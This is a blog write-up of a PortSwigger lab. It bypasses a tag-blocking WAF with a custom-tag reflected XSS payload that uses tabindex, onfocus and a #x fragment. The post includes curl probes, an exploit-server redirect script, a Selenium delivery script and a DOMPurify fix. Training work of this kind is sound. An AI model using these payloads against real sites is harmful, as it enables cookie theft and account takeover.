---
layout: post
title: "PortSwigger: Reflected XSS — All Tags Blocked Except Custom Ones"
date: 2027-06-10 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [portswigger, xss, cwe-79, waf-bypass, custom-tags, reflected-xss, onfocus, tabindex, exploit-server]
---

A reflected [cross-site scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html) lab where a WAF blocks every standard HTML tag name — but allows completely arbitrary, made-up tag names. The bypass: invent a tag (`<xss>`), make it focusable with `tabindex`, attach `onfocus=alert(document.cookie)`, and deliver the URL with a `#id` fragment that auto-focuses it on load.

## Overview

**Lab:** Reflected XSS into HTML context with all tags blocked except custom ones  
**Source:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)  
**Vuln class:** [CWE-79 — Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

The application echoes a `search` query parameter directly into the HTML page without encoding angle brackets. A WAF intercepts requests containing known HTML tag names and returns `400 "Tag is not allowed"`. Custom (non-standard) tag names are not on the blocklist and pass through unhindered. One crafted URL delivered via the exploit server triggers `alert(document.cookie)` in the victim's browser.

## The technique

HTML parsers don't care whether a tag name is real. The browser creates a DOM node for `<xss id=x tabindex=1>` just as readily as it would for `<span>`. The WAF uses a blacklist of *known* tags — and that list is finite. Any string not on it (including entirely invented names) passes straight through.

The two extra attributes do the real work:

- **`tabindex=1`** — makes any element focusable, not just form controls and links.
- **`onfocus=alert(document.cookie)`** — fires the moment the element receives keyboard or programmatic focus.

The trigger is the **URL fragment** (`#x`). When a browser navigates to `https://example.com/page#x`, it scrolls to and *focuses* the element with `id="x"`. For a focusable element, this fires the `focus` event — and `onfocus` runs without any user interaction beyond opening the link.

## Solution

### 1. Confirm standard tags are blocked

```bash
curl -sk "https://LAB_ID.web-security-academy.net/?search=%3Cimg+src%3D1+onerror%3Dprint()%3E" -o /dev/null -w "%{http_code}\n"
# → 400
```

### 2. Confirm custom tags pass through

```bash
curl -sk "https://LAB_ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E" -o /dev/null -w "%{http_code}\n"
# → 200
```

The reflected HTML contains `<xss id=x onfocus=alert(document.cookie) tabindex=1>` verbatim — the WAF has no entry for `xss`.

### 3. Craft the exploit server payload

Store this in the exploit server body:

```html
<script>
location = "https://LAB_ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x";
</script>
```

The `#x` fragment at the end is the critical piece. It tells the browser to focus the `<xss id=x>` element the instant the page loads.

### 4. Deliver to victim

Drive the exploit server form through a browser session — the raw `/deliver-to-victim` API endpoint alone does not trigger the victim bot. Using Selenium headless Chromium:

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time

ESVR = "https://exploit-ID.exploit-server.net"
LAB  = "https://LAB_ID.web-security-academy.net"
BODY = f'<script>\nlocation = "{LAB}/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x";\n</script>'

o = Options()
for a in ["--headless=new","--no-sandbox","--disable-dev-shm-usage","--disable-gpu","--ignore-certificate-errors"]:
    o.add_argument(a)
d = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=o)
try:
    d.get(ESVR + "/")
    area = d.find_element(By.NAME, "responseBody")
    area.clear(); area.send_keys(BODY)
    d.find_element(By.CSS_SELECTOR, "button[value='DELIVER_TO_VICTIM']").click()
    time.sleep(5)
finally:
    d.quit()
```

### 5. Confirm solved

```bash
curl -sk "https://LAB_ID.web-security-academy.net/" | grep -o 'is-solved\|is-notsolved'
# → is-solved
```

## Why it worked

The WAF maintains a **blacklist** of tag names to block. Blacklists enumerate *known bad inputs* — they are inherently incomplete because the space of possible tag names is unbounded. A string like `xss` is not a real HTML tag, so it has no entry in the list. The browser, however, will parse it happily and attach any attributes (including event handlers) to the resulting DOM node.

The focus-via-fragment trick avoids needing any user interaction: `onfocus` is a passive event that fires automatically when `#x` navigation lands the browser on the element. No `onmouseover`, no click required.

## Fix / defense

Replace the tag-name blacklist with an **allowlist** enforced by a sanitisation library. DOMPurify's default configuration strips all event handler attributes and restricts tags to a safe subset:

```js
// Vulnerable — blacklist is never exhaustive:
const blocked = ['script', 'img', 'iframe', 'svg', ...];
if (blocked.includes(tagName.toLowerCase())) return reject();

// Fixed — allowlist with DOMPurify:
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
document.querySelector('#results').innerHTML = safe;
```

DOMPurify strips every event handler attribute and every non-allowlisted tag — including arbitrary custom names — by default. No enumeration of bad tags needed.
